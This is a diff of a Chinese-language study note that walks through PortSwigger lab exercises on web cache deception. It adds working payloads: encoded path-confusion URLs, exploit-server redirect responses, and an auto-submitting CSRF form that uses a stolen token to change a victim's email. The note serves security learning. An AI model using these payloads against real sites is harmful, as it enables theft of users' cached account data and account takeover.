@@ -133,6 +133,8 @@ https://portswigger.net/web-security/web-cache-deception#normalization-discrepan
 
 ## Detecting normalization by the origin server
 
+https://portswigger.net/web-security/web-cache-deception#detecting-normalization-by-the-origin-server
+
 比較以下兩個 non-cacheable + non-idempotent 請求的 Response 是否有差異
 
 ```
@@ -143,6 +145,8 @@ POST /aaa/..%2fprofile
 有差異 => 代表 Origin Server 沒有 normalization
 
 ## Detecting normalization by the cache server
+
+https://portswigger.net/web-security/web-cache-deception#detecting-normalization-by-the-cache-server
 
 先找到一個有被快取的 resource，假設是
 
@@ -188,12 +192,101 @@ Location: https://0a1a00fc0390a75d8284293700b800c9.web-security-academy.net/reso
 
 Deliver exploit to victim 之後，在登入的情況訪問 /resources/..%2fmy-account，就會吃到 victim 的快取
 
+## Exploiting normalization by the cache server
+
+https://portswigger.net/web-security/web-cache-deception#exploiting-normalization-by-the-cache-server
+
+假設有以下 path，origin server 使用 `;` 作為 delimiter
+
+```
+/profile;%2f%2e%2e%2fstatic
+```
+
+- cache server interprets the path as `/profile;/../static` => `/static`
+- origin server interprets the path as: `/profile`
+
 ## Lab: Exploiting cache server normalization for web cache deception
 
 | Dimension | Description                                                                                            |
 | --------- | ------------------------------------------------------------------------------------------------------ |
 | Document  | https://portswigger.net/web-security/web-cache-deception#exploiting-normalization-by-the-cache-server  |
 | Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization |
+
+這題的 delimiter 是 `#`，但必須要 URL encode，不然會被視為 URL fragment，`#` 以及之後的 component 就不會被帶到 HTTP Request Startline
+
+所以我們構造
+
+```
+/my-account%23%2f..%2fresources%2fscript.js
+```
+
+- cache server interprets the path as `/my-account#/../resources/script.js` => `/resources/script.js`
+- origin server interprets the path as: `/my-account`
+
+確定有快取後，在 exploit-server 構造
+
+```
+HTTP/1.1 302 Found
+Location: https://0a660033049941da82a93480009c0044.web-security-academy.net/my-account%23%2f..%2fresources%2fscript.js
+```
+
+## Lab: Exploiting exact-match cache rules for web cache deception
+
+| Dimension | Description                                                                                         |
+| --------- | --------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/web-cache-deception#exploiting-file-name-cache-rules           |
+| Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules |
+
+這題的 robots.txt 有快取，構造
+
+```
+/my-account;%2f..%2frobots.txt
+```
+
+有成功快取，接著在 exploit-server 構造
+
+```
+HTTP/1.1 302 Found
+Location: https://0aff00ed0398d01181cee84d00e80084.web-security-academy.net/my-account;%2f..%2frobots.txt
+```
+
+Deliver exploit to victim 之後，訪問 /robots.txt，可以得到 admin 的 csrf，但記得開 F12 > Network 的手速要快，因為這題有 validateSession，所以會被導回登入頁
+
+偷到 csrf 後，接下來就是 csrf 的環節，在 exploit-server 構造
+
+```html
+<form
+  class="login-form"
+  name="change-email-form"
+  action="https://0aff00ed0398d01181cee84d00e80084.web-security-academy.net/my-account/change-email"
+  method="POST"
+>
+  <label>Email</label>
+  <input required="" type="email" name="email" value="hello@world" />
+  <input
+    required=""
+    type="hidden"
+    name="csrf"
+    value="31iV6s1EZtLjucrsxDjnkZgzMIa8VHdS"
+  />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+之後 Deliver exploit to victim，成功解題
+
+是說這題需要 Deliver exploit to victim 兩次，實務上要讓同一個使用者中招兩次，並且還要確保 csrf 沒過期，感覺攻擊向量有點難達成啊(?)
+
+## 小結
+
+這系列的 Lab，我覺得會用到很多先前的知識，包含
+
+[Path traversal](./path-traversal.md)
+[Web cache poisoning](./web-cache-poisoning.md)
+
+放到比較後面才來解，解的過程很順利，用 Lab 提供的 exploit 手法，基本上都能秒解
 
 ## 參考資料
 
